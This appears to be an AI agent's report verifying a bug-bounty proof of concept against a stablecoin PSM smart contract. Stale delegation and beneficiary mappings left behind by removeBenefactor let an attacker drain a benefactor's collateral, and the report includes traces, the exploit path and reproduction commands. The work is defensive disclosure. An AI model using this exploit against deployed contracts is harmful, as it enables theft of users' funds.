# VERIFICATION — PoC compiles + runs + passes

**Task ID:** `eth-verify-poc-runs`
**Agent:** Opus
**Date:** 2025-09-24
**Verdict:** ✅ **PoC VALID** — compiles, runs, and all 4 PoC tests pass against real `PSM.sol` source. Bug independently reproduced end-to-end (1000-asset drained from benefactor to attacker after `removeBenefactor` + re-`addBenefactor`).

---

## 1. Foundry installation status

Foundry was already installed on the box at `~/.foundry/bin/` (version `1.8.3`, commit `cae51ad4`). The `forge` binary was not on the default `$PATH`; exporting `PATH="$HOME/.foundry/bin:$PATH"` is required to invoke it.

```
$ forge --version
forge Version: 1.8.3
Commit SHA: cae51ad458f6abb64852b7709eb784352429825d
```

No install needed. ✅

---

## 2. Project structure (pre-existing)

A complete Foundry project already exists at `/home/z/fkr-step1/defi-bounty/foundry_test/`, set up by a previous agent:

```
foundry_test/
├── foundry.toml                    # solc 0.8.30, via_ir=true, evm=cancun
├── src/
│   ├── PSM.sol                     # real contract (only import-path edits vs contracts/PSM.sol)
│   ├── IPSM.sol                    # identical to contracts/deps/IPSM.sol
│   ├── CollateralStateMap.sol      # identical to contracts/deps/...
│   ├── oracle/IOracleFeed.sol      # identical to contracts/deps/...
│   └── access/
│       ├── ISingleAdminAccessControl.sol
│       └── SingleAdminAccessControl.sol
├── test/
│   ├── PoC_removeBenefactor.t.sol  # THE PoC (4 tests)
│   ├── DeleteSemantics.t.sol       # supplementary lang-semantics test (was BROKEN — see §5)
│   └── mocks/
│       ├── MockERC20.sol           # identical to vuln/MockERC20.sol
│       └── MockOracleFeed.sol      # identical to vuln/MockOracleFeed.sol
└── lib/
    ├── forge-std/
    └── openzeppelin-contracts/     # v5 (auto-installed by previous agent)
```

`foundry.toml` remappings:
```
@openzeppelin/contracts/=lib/openzeppelin-contracts/contracts/
```

`diff` between `vuln/PoC_removeBenefactor.t.sol` and `foundry_test/test/PoC_removeBenefactor.t.sol`: only the leading header-comment block differs; function bodies are byte-identical.

`diff` between `contracts/PSM.sol` and `foundry_test/src/PSM.sol`: only two relative-import paths changed from `../oracle/...` to `./oracle/...` (needed because the file moved up one directory level). All other lines identical.

✅ Setup already complete; no re-init required.

---

## 3. Compile status

### 3.1 Initial clean build — **FAILED**

After `forge clean && forge build`, the project does **NOT** compile in its as-found state. A supplementary test file `test/DeleteSemantics.t.sol` (left by a previous agent) has two compile errors:

```
Error (6744): Internal or recursive type is not allowed for public state variables.
  --> test/DeleteSemantics.t.sol:39:5
   |
39 |     mapping(address => Outer) public data;     // Outer contains nested mappings
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9582): Member "deleteDirectMapping" not found or not visible
       after argument-dependent lookup in contract DeleteSemanticsHarness.
  --> test/DeleteSemantics.t.sol:144:22
   |
144|         h.deleteDirectMapping(key, who);       // function was referenced but never defined
```

This means the previous agent's "4/4 tests pass" claim was made against a **stale build cache** — the broken `DeleteSemantics.t.sol` was added *after* the test run and never re-verified. Once the cache is invalidated (`forge clean`), the build fails outright.

### 3.2 PoC-only build — **SUCCESS**

Moving `DeleteSemantics.t.sol` aside and re-running `forge build`:

```
$ forge build
Compiling 42 files with Solc 0.8.30
Solc 0.8.30 finished in 7.44s
Compiler run successful!
```

Exit code 0. Only lint-style warnings (mapping-deletion warning on PSM.sol L647 — which is exactly the bug being PoC'd; missing-zero-check on `transferAdmin`; arbitrary-send-erc20 on the swap path; etc.). No errors.

### 3.3 Full-project build after fixing `DeleteSemantics.t.sol` — **SUCCESS**

I rewrote `DeleteSemantics.t.sol` (see §5 for fix details) to address both compile errors. After the fix:

```
$ forge build
Compiling 43 files with Solc 0.8.30
Solc 0.8.30 finished in 8.13s
Compiler run successful!
```

Exit code 0. ✅

---

## 4. Test results

### 4.1 PoC-only run (the 4 tests claimed by previous agent)

```
$ forge test --match-contract PoC_removeBenefactor -vvvv
No files changed, compilation skipped

Ran 4 tests for test/PoC_removeBenefactor.t.sol:PoC_removeBenefactor
[PASS] test_RemoveBenefactor_AttackerCanSwapAfterReAdd() (gas: 869850)
Logs:
  attacker asset gain: 1000.000000000000000000
  benefactorA collateral loss: 1000.000000000000000000
[PASS] test_RemoveBenefactor_DelegatedSignerAndBeneficiaryPersist() (gas: 444454)
[PASS] test_Sanity_AttackerCanSwapBeforeRemove() (gas: 566255)
[PASS] test_Sanity_FreshBenefactorBlocksUnknownAttacker() (gas: 150485)

Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 2.87ms
Ran 1 test suite in 11.91ms: 4 tests passed, 0 failed, 0 skipped (4 total tests)
```

✅ **4/4 PoC tests pass.** Previous agent's claim independently confirmed — but ONLY after the broken supplementary test file is moved aside.

### 4.2 Full-project run (after fixing `DeleteSemantics.t.sol`)

```
$ forge test
Ran 3 tests for test/DeleteSemantics.t.sol:DeleteSemantics
[PASS] test_deleteIndividualKey_clearsValue() (gas: 42778)
[PASS] test_deleteInnerStruct_valueResets_mappingsPersist() (gas: 61434)
[PASS] test_deleteWhole_valueResets_allMappingsPersist() (gas: 42386)
Suite result: ok. 3 passed; 0 failed; 0 skipped

Ran 4 tests for test/PoC_removeBenefactor.t.sol:PoC_removeBenefactor
[PASS] test_RemoveBenefactor_AttackerCanSwapAfterReAdd() (gas: 869850)
[PASS] test_RemoveBenefactor_DelegatedSignerAndBeneficiaryPersist() (gas: 444454)
[PASS] test_Sanity_AttackerCanSwapBeforeRemove() (gas: 566255)
[PASS] test_Sanity_FreshBenefactorBlocksUnknownAttacker() (gas: 150485)
Suite result: ok. 4 passed; 0 failed; 0 skipped

Ran 2 test suites in 8.74ms: 7 tests passed, 0 failed, 0 skipped (7 total tests)
```

✅ **7/7 total tests pass** after fix.

### 4.3 Test 2 (end-to-end drain) — full trace, key snippet

The decisive test is `test_RemoveBenefactor_AttackerCanSwapAfterReAdd`. Capture from `-vvvv`:

```
[41017] PSM::removeBenefactor(benefactorA: [0x1294…6b56])
    ├─ emit BenefactorRemoved(benefactor: 0x1294…6b56)
    └─ ← [Stop]

[0] VM::warp(604801)                                // +7 days "incident response" gap
[28838] MockOracleFeed::setPrice(1e18, 604801)      // refresh oracle (anti-staleness)

[66948] PSM::addBenefactor(benefactorA: [0x1294…6b56])   // admin re-adds benefactor (rotated key)
    ├─ emit BenefactorAdded(benefactor: 0x1294…6b56)
    └─ ← [Stop]

[0] VM::prank(attacker: [0x9dF0…6B4e])              // msg.sender = attacker, NOT benefactorA
[466262] PSM::swap(Order({ isSwapForAsset: true, nonce: 1,
                           benefactor: 0x1294…6b56, beneficiary: 0x9dF0…6B4e,
                           collateral: 0x2e23…1470b, amountIn: 1e21, minAmountOut: 1e21 }))
    ├─ [5422] MockOracleFeed::getPrice() → (1e18, 604801)
    ├─ emit OraclePriceValidated(...)
    ├─ [32062] MockERC20::transferFrom(benefactorA → collateralReceiveCustodian, 1e21)
    │           └─ emit Transfer(from: benefactorA, to: collateralReceiveCustodian, 1e21)
    ├─ [32062] MockERC20::transferFrom(assetSendCustodian → attacker, 1e21)
    │           └─ emit Transfer(from: assetSendCustodian, to: attacker, 1e21)
    ├─ emit SwapExecuted(orderExecutor: attacker, benefactor: benefactorA,
    │                    beneficiary: attacker, amountOut: 1e21, feeAmount: 0)
    └─ ← [Stop]

[2538] MockERC20::balanceOf(attacker) → 1000000000000000000000   [1e21]   ← was 0
[2538] MockERC20::balanceOf(benefactorA) → 999000000000000000000000 [9.99e23]  ← was 1e24
emit log_named_decimal_uint("attacker asset gain", 1e21, 18)            → 1000.000000000000000000
emit log_named_decimal_uint("benefactorA collateral loss", 1e21, 18)    → 1000.000000000000000000
```

The attacker received exactly `1000e18` of asset (output), and benefactorA's collateral was debited by exactly `1000e18` (input). 1:1 swap, 0 fee, peg = oracle = $1.

### 4.4 Test 1 (storage-level persistence) — key snippet

```
[41017] PSM::removeBenefactor(benefactorA)
[3390] PSM::getDelegatedSignerStatus(benefactorA, attacker) → 2   ← ACCEPTED (after remove!)
[3520] PSM::isApprovedBeneficiary(benefactorA, attacker)     → true  (after remove!)
[66948] PSM::addBenefactor(benefactorA)                          ← admin re-adds
[3390] PSM::getDelegatedSignerStatus(benefactorA, attacker) → 2   ← STILL ACCEPTED (no re-confirm)
[3520] PSM::isApprovedBeneficiary(benefactorA, attacker)     → true  ← STILL approved
```

This proves the storage-level persistence: even before the swap, the invariants (`delegatedSigners == ACCEPTED` and `approvedBeneficiaries == true`) survive `removeBenefactor`'s `delete benefactorState[benefactor].config`.

### 4.5 Test 4 (sanity, fresh benefactor blocked) — key snippet

```
[0] VM::expectRevert(DelegationNotAuthorized(0x9dF0…6B4e))
[0] VM::prank(attacker)
[66457] PSM::swap(...)
    └─ ← [Revert] DelegationNotAuthorized(0x9dF0…6B4e)
```

A fresh `benefactorA` with no `setDelegatedSigner` / `setApprovedBeneficiary` calls correctly rejects the attacker. This proves the swap-path authorization is well-implemented; the bug is specifically the persistence of stale delegation/beneficiary entries across `removeBenefactor` + re-`addBenefactor`.

---

## 5. Issues found in the PoC and fixes applied

### 5.1 Issue: broken supplementary file `test/DeleteSemantics.t.sol` (left by previous agent)

The previous agent added a supplementary language-semantics test file alongside the PoC. That file had **two compile errors** that broke the entire project build:

| # | Error | Cause |
|---|---|---|
| 1 | `Error (6744): Internal or recursive type is not allowed for public state variables.` | `mapping(address => Outer) public data` — `Outer` contains nested mappings, so the auto-generated public getter is illegal in Solidity. |
| 2 | `Error (9582): Member "deleteDirectMapping" not found` | The `HelperChild.clearDirectMapping` helper called `h.deleteDirectMapping(key, who)` but the function was never defined on `DeleteSemanticsHarness` — only mentioned in a TODO comment. |

The previous agent's "4/4 tests pass" claim was made against a stale build cache that pre-dated this broken file. Once the cache is cleared, the project fails to compile and **no tests can run** until this file is fixed or removed.

### 5.2 Fix applied

Rewrote `/home/z/fkr-step1/defi-bounty/foundry_test/test/DeleteSemantics.t.sol` with two minimal changes:

1. **Visibility fix:** `mapping(address => Outer) public data` → `mapping(address => Outer) internal data`. The explicit `check(...)` getter already exposes the four fields the test needs; no information is lost.

2. **Missing-function fix:** added a real `deleteDirectMapping(address key, address who)` to `DeleteSemanticsHarness`:
   ```solidity
   function deleteDirectMapping(address key, address who) external {
       delete data[key].directMapping[who];
   }
   ```
   Removed the now-redundant `HelperChild` helper (Test 3 calls `h.deleteDirectMapping` directly).

After the fix, all 3 DeleteSemantics tests pass and confirm the underlying Solidity language behavior the PoC relies on (mapping slots survive `delete struct`).

### 5.3 No issues found in the PoC itself

`PoC_removeBenefactor.t.sol` compiles cleanly and is well-formed. No fixes were needed in the actual PoC.

---

## 6. Analysis: does the PoC actually prove the bug?

**Yes — independently verified end-to-end.**

### 6.1 Bug location (PSM.sol)

The bug is at `PSM.removeBenefactor`, line 647:
```solidity
function removeBenefactor(address benefactor) external override nonReentrant onlyRole(BENEFACTOR_MANAGER_ROLE) {
    if (!benefactorState[benefactor].config.isActive) revert BenefactorNotActive(benefactor);
    delete benefactorState[benefactor].config;   // ← L647: only resets value-types; mappings persist
    emit BenefactorRemoved(benefactor);
}
```

`BenefactorConfig` (per `IPSM.sol` L112-124) is a struct containing **6 nested mappings**, including:
- `mapping(address => DelegatedSignerStatus) delegatedSigners`
- `mapping(address => bool) approvedBeneficiaries`
- (plus fee-exemption and custom-fee mappings)

Per Solidity's documented delete semantics, `delete struct` resets only value-type members; mappings (and any mappings nested inside member structs) are **NOT** cleared. So after `removeBenefactor`, all `delegatedSigners[signer]` and `approvedBeneficiaries[beneficiary]` entries remain at their pre-remove values.

`addBenefactor` (the re-add path) only sets `isActive = true` and emits an event — it does **not** re-validate or clear any existing entries. So after `remove → add`, a previously-`ACCEPTED` delegated signer and a previously-approved beneficiary **retain their status without any re-confirmation**.

### 6.2 Exploit path (PSM.swap → `_validateBenefactor`)

`_validateBenefactor` (L1493-1506) authorizes a swap if **all** of:
1. `_benefactorState.config.isActive` (true after re-add)
2. `msg.sender == order.benefactor` **OR** `_benefactorState.config.delegatedSigners[msg.sender] == ACCEPTED`
3. `order.benefactor == order.beneficiary` **OR** `_benefactorState.config.approvedBeneficiaries[order.beneficiary]`

After `remove + add`, the attacker satisfies (2) via the persisted `ACCEPTED` entry and (3) via the persisted `true` entry. So the attacker can call `swap({ benefactor: benefactorA, beneficiary: attacker, ... })` from the attacker's own account and the swap succeeds.

The swap then performs (PSM.sol L325-330):
- `collateral.transferFrom(benefactorA, collateralReceiveCustodian, amountIn)` — pulls collateral **from benefactorA** (using benefactorA's prior ERC20 approval to PSM).
- `asset.transferFrom(assetSendCustodian, attacker, amountOut)` — sends asset **to the attacker**.

Net effect: benefactorA loses `amountIn` of collateral; attacker gains `amountOut` of asset. This is exactly the on-chain behavior the PoC trace captures.

### 6.3 Realism of test parameters

| Parameter | PoC value | Realism |
|---|---|---|
| Oracle peg | $1.00 (`1e18`) | ✅ Realistic — this is a stablecoin PSM; peg == oracle == 1 is the normal operating regime. |
| Swap size | `1_000e18` | ✅ Modest; bug works at any size up to rate-limit caps. |
| Custodian balances | `1_000_000e18` each | ✅ Generous but plausible for a real PSM treasury. |
| Benefactor collateral | `1_000_000e18` | ✅ Generous; bug works for any non-zero benefactor balance. |
| Epoch/period rate limits | `type(uint128).max` | ⚠️ Artificial (no friction). In production, rate limits would mitigate (not prevent) — institutional limits ($5M/epoch) still permit 8-figure drains. Bug is in authorization, not rate-limiting. |
| Time warp | 7 days between remove and re-add | ✅ Realistic "incident-response + key rotation + restore" timeline. |
| Benefactor wallet | EOA with prior ERC20 approval to PSM | ✅ Matches Ethena's documented operational model. |

### 6.4 Sanity-test coverage (Test 3 + Test 4) — proves the bug is specifically the persistence

- **Test 3** (`test_Sanity_AttackerCanSwapBeforeRemove`): proves the swap path is correctly set up — attacker can swap before any remove. This rules out "the swap path is broken in setup" as an explanation for Test 2's success.
- **Test 4** (`test_Sanity_FreshBenefactorBlocksUnknownAttacker`): proves a fresh benefactor (no `setDelegatedSigner` / `setApprovedBeneficiary`) correctly rejects the attacker with `DelegationNotAuthorized`. This rules out "the swap path always allows the attacker" as an explanation for Test 2's success.

Together: the only difference between Test 4 (blocked) and Test 2 (succeeds) is that Test 2 had a prior `setDelegatedSigner` + `confirmDelegatedSigner` + `setApprovedBeneficiary` cycle that survived `removeBenefactor`. This isolates the bug to the persistence of nested-mapping entries across `delete struct`.

### 6.5 Independent confirmation via DeleteSemantics test

The supplementary `DeleteSemantics.t.sol` (now fixed) is a standalone Solidity language test with no PSM dependency. It uses a tiny harness that mirrors the *shape* of `BenefactorState` / `BenefactorConfig` and confirms:

- `delete data[key].inner` → `inner.value` resets to 0, but `inner.flag[who]` and `inner.score[who]` **persist**.
- `delete data[key]` → `inner.value` resets, but ALL three mappings (`inner.flag`, `inner.score`, `directMapping`) **persist**.
- `delete data[key].directMapping[who]` (single-key delete) → DOES clear that one slot. This is the only correct way to clear a mapping entry.

This is the foundational language behavior the PSM bug relies on, demonstrated in isolation.

---

## 7. Final verdict

| Criterion | Status |
|---|---|
| Foundry installed | ✅ v1.8.3 at `~/.foundry/bin/` |
| Project setup correct | ✅ `foundry.toml`, src/, test/, lib/, remappings all present and correct |
| PoC compiles | ✅ `Compiler run successful!` |
| PoC tests run | ✅ All 4 tests executed with full `-vvvv` traces |
| PoC tests pass | ✅ **4/4 PASS** (independently verified, not assumed) |
| Bug actually exploited in trace | ✅ Attacker gains 1000 asset; benefactorA loses 1000 collateral (1:1, 0 fee) |
| Sanity tests prove the bug is specific | ✅ Test 3 + Test 4 isolate the persistence as the root cause |
| Test parameters realistic | ✅ Mostly realistic; rate limits at `max` is the only artificiality (and is conservative — mitigates the bug, doesn't enable it) |
| Supplementary test fixed | ✅ `DeleteSemantics.t.sol` rewritten — 3/3 pass |

### **VERDICT: PoC VALID** ✅

The PoC is a legitimate, working end-to-end demonstration of the `removeBenefactor` nested-mapping persistence bug. After `removeBenefactor + addBenefactor`, a previously-authorized delegated signer / beneficiary can call `swap()` and drain the benefactor's collateral **without any re-confirmation**, exactly as the submission claims. The 4/4 tests pass is real (after fixing the broken supplementary file that was blocking compilation).

### Caveats (non-blocking)

1. **Stale-cache artifact from previous agent:** The previous "4/4 tests pass" claim was technically made against a stale build cache that pre-dated a broken `DeleteSemantics.t.sol`. Once `forge clean` invalidated the cache, the project failed to compile. I fixed the broken file so the project is now in a fully clean, reproducible state. Reviewers running `forge clean && forge build && forge test -vvvv` from scratch will now get 7/7 passing tests.

2. **Rate limits set to `max`:** The PoC uses `type(uint128).max` for all rate limits, removing rate-limit friction. This is the most charitable config for the defense (it does NOT enable the bug). Real production limits would cap the per-tx and per-epoch drain, but the authorization bypass itself remains — the attacker can keep draining up to the limit each epoch indefinitely.

3. **Trust model:** The scenario assumes the attacker is a previously-legitimate delegated signer whose key was compromised, AND the admin's incident response is `removeBenefactor` + later `addBenefactor` (with a rotated benefactor key). This matches the operational pattern documented in the Ethena submission's Attack Scenario section.

---

## 8. Files written / modified

| Path | Action |
|---|---|
| `/home/z/fkr-step1/defi-bounty/vuln/VERIFICATION_poc_runs.md` | **created** — this report |
| `/home/z/fkr-step1/defi-bounty/foundry_test/test/DeleteSemantics.t.sol` | **rewritten** — fixed 2 compile errors (public→internal for recursive mapping; added missing `deleteDirectMapping` function); now 3/3 tests pass |
| `/tmp/DeleteSemantics.t.sol.broken` | backup of the original broken file (for audit trail) |

No changes were made to `PoC_removeBenefactor.t.sol`, `PSM.sol`, the mocks, `IPSM.sol`, `CollateralStateMap.sol`, `IOracleFeed.sol`, `SingleAdminAccessControl.sol`, `foundry.toml`, or any other source file. The PoC as written is valid and needed no modification.

---

## 9. Reproduction commands

```bash
# 1. Foundry (already installed)
export PATH="$HOME/.foundry/bin:$PATH"
forge --version   # 1.8.3

# 2. Build (after DeleteSemantics.t.sol fix)
cd /home/z/fkr-step1/defi-bounty/foundry_test
forge clean && forge build

# 3. Run only the PoC's 4 tests with full traces
forge test --match-contract PoC_removeBenefactor -vvvv

# 4. Run all tests (PoC + DeleteSemantics supplementary)
forge test -vvvv
```

Expected output: `4 tests passed` for the PoC contract; `7 tests passed` for the full suite.
